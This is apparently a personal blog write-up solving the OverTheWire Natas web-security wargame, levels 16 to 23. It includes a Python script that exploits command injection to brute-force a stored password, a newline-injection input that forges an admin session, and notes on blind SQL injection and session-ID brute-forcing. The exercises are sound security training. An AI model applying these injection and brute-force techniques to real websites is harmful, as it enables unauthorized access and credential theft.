---
layout: article
key: 202003230
pageview: true
title: Natas Wargames Solutions (16-30)
tags: ctf
excerpt: My followup writeup to challenges that I solved in Natas Wargames
---

## Overview

These set of challenges on the Wargames are focussed on Web Application Security Testing and Scanning. Each machine stores the credentials for the next machine. **All passwords are also stored in /etc/natas_webpass/**. In this article, I cover the solutions from 16-34.

These are followup to the challenges post which I put out earlier for the challenges 1-15.





### Natas 16

This one presents us with the possibility of command injection. But there is a twist - There is a filtering on characters like ';', '|' /[;|&`\'"]/ etc. This removes the possibility of simply appending a command and getting it executed. Remember, our goal here is to read the contents of the file **/etc/natas_webpass/natas17**. 

The first clue is if we search for something like "__^He__". Note that the "^" is not in the list of illegal characters. We get all the words starting from the letters "He" like He , Hebrew etc. 

The question we should be asking is __"What if we could use the contents of the target file to perform the search? "__

Look at the expression

```bash
^$(grep -o ^A /etc/natas_webpass/natas17)
```

What this expression is doing is searching for a prefix "A", i.e checking whether the password is starting with  A, and then using the result of the inner prefix search to feed the outer "^" . If the password does start with an A, it would simply return the letter A (The matched prefix), and if it fails the grep returns null, so the command simply becomes ^null , and we search for ^ which returns all words. However we could simply add a letter , say "I" after the above expression.

```bash
^$(grep -o ^A /etc/natas_webpass/natas17)I
```

What do we get now? If the inner grep fails (the prefix guess is incorrect), the query resolves to **^I** , and if the inner query is successful, the query resolves to **^{matched prefix}I**. If we search for the letter I, the results always begin with the single personal pronoun "I".

So here we start by launching a bruteforce attack on all the characters in keyspace [a-zA-Z0-9] across the length of the password(same length for all levels). We can automate this in python with the powerful **requests** module which supports multiple http authentication types. The script is shown below. 

```python
import requests
from requests.auth import HTTPBasicAuth


#identified sample=^$(grep -o ^Wa natas16)I

user='natas16'
passw='WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
#clumsy but manageable
keyspace="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
leet = ""
for i in range(len(passw)):
    
    #if inner loop's guess is wrong then exploit will return I
    for j in range(len(keyspace)):
        expl ="^$(grep -o ^{} /etc/natas_webpass/natas17)I".format(leet+keyspace[j])
        #print(expl)
        payload= {'needle': expl, 'submit': 'Search'}
        answer=requests.get('http://natas16.natas.labs.overthewire.org/', params=payload,auth=HTTPBasicAuth(user,passw))
        str1 = answer.text
        start = str1.find('<pre>\n')+len('<pre>\n')
        end = str1.find('</pre>')
        str2=[x for x in str1[start:end].split("\n")]
        #print(str2[0])
        if str2[0]!='I':
            leet+=keyspace[j]
            print(leet)
            break
print(leet)

```

Good programming excercise to get command injection.



### Natas 17

To get the credentials of Natas18, we need to launch a blind SQL injection attack as the outputs of the SQL query are being consumed by the web server to prevent diagnosis. To achieve this , a good programming excercise is to write your own tool in python . However, I used SQLMap which performs the blind SQL injection attack and prints the password.



### Natas 18

The idea here is to login as admin, and get the web application to display the password for the next level. However, the admin does not have a brute-forcible password. The point of target here then becomes to guess the PHPSESSID of the admin. In a comment in the source code , it is mentioned that the PHPSESSID has only 640 possible values - which means we should be able to bruteforce it easily.

While you may write a python code, to solve this level, I used BurpSuite's intruder to bruteforce the cookies field. 



### Natas 19

Idea to get the solution here is very similar to the earlier level. Instead of sequential PHPSESSID , it is now a hex encoded value of this {session number}-{username}.  Here, we just bruteforce the session number again, and append it with the targeted username of admin, and then convert it to hex. This can be done by Intruder, and it allows for conversion to hex and adding a suffix to the target payload with ease to the targeted payload.



### Natas 20

To solve this challenge, we must  once again read and analyze the underlying PHP source code. We are logged in as regular user, and we must login as admin.  On reading the source code, we get to know that session is being read from a file. 

To understand better, here is the list of functions in the source code with their functions.Let’s look at each function and see what it does:

- **debug**($msg) Turns on debug if debug is a parameter in the GET request to the page.
- **print_credentials**() will print natas21 username and password if the following conditionals are satisfied: This is what we need to accomplish at the end of our excercise.
  - $_SESSION is true if there is an existing session. The array $_SESSION is not empty.
  - array_key_exists(“admin”, $_SESSION) is true if “admin” key is set in $_SESSION.
  - $_SESSION[“admin”] == 1 is true if the value associated with the key “admin” in $_SESSION is set to 1
- **myopen($path, $name)** always return true provided the path of the file exists.
- **myclose()** always returns true.
- **myread($sid)** has several parts
  - The first if(strspn….) statement check if the $sid contains characters that is within the long string of characters. If it is not, return “Invalid SID”. Otherwise, continue.
  - Then, it check to see if the path exist for the file call /mysess_$sid. For example, if $sid is abcdefg, it is checking for the file mysess_abcdefg. If the file exist, continue.
  - Here, we see that the content of the file is save in $data and the foreach loop take each new line of $data and put it in $line. Then, it takes each space separated word in each $line and put them in an array call $parts. If the first part ($parts[0]) is not an empty string, then it will use the first part as the session key and the second part ($parts[1]) as the value corresponding to that key.
- mywrite($sid, $data) also has several parts
  - The first if(strspn …) does the same check for valid $sid in myread()
  - The same $filename is created using the $sid.
  - The key is sorted in $_SESSION and the foreach loop take the pair of $key and corresponding $value and add it as a new line in $data. The $data is then write to the $filename. Note that new line is used to explode the key value pair and then written to the file. This is the entry point for our approach, **response splitting** attack. The 
- mydestroy($sid) always return true.
- mygarbage($t) always return true.
- main interface does the following:
  - session_start().
  - check name is in the $_REQUEST, if so, set the $_SESSION[“name”] to $_REQUEST[“name”]. If we input “test” as a name, it will correspond “test” as the
  - print_credentials()
  - set $name to empty string and check if “name” is in the $_SESSION, if so, set the variable $name to $_SESSION[“name”]

The key value pair is being read from the file in the $filename. The key vakye oair is being read, and the value of the "admin" must be 1. 
The question is "**Can we insert the line admin=1 by the inputs given to us?**" The trick here is to insert an extra line, and we can do so by splitting up our response. The input would be

```bash
user1%0Aadmin 1
```

This input would be split into 2 usernames when processed by the mywrite function and write the new line "admin 1" after user1. %0a injected here is the newline character. This injection can be done in the url itself. Once the injection is done, we can change the username to admin with ease and get the credentials.





### Natas 21

This challenge is also based on session hijacking. This can be done by tampering the cookie value in the related website. However this is much easier than the previous challenge, we need only inject an extra parameter in the post request of the form to change the color. This parameter is well **admin=1**, which can be deduced by reading the website of the sister site for this challenge. Once this is done, just relaod the web page with the set cookie, and the credentials are revealed. 



### Natas 22

This one is a pretty simple challenge to crack. The main page keeps redirecting you away from it, but when one is using a proxy like Burp, all the redirections and the web page visited are stored in the HTTP history. The webpage we are redirected away from stores the credentials till the redirection limit is reached. The redirect only happens when the query parameter is present in the URL which is also needed to see the credentials.


![picnatas22]({{site.url}}/public/picnatas22.PNG)



### Natas 23

This one is too easy. The acceptability of the input to reveal the password is specified in the code.he first few digits must be number and greater than 10.
The string must also contain iloveyou. The input 233iloveyou works and reveals the credentials for the next level.



### Natas24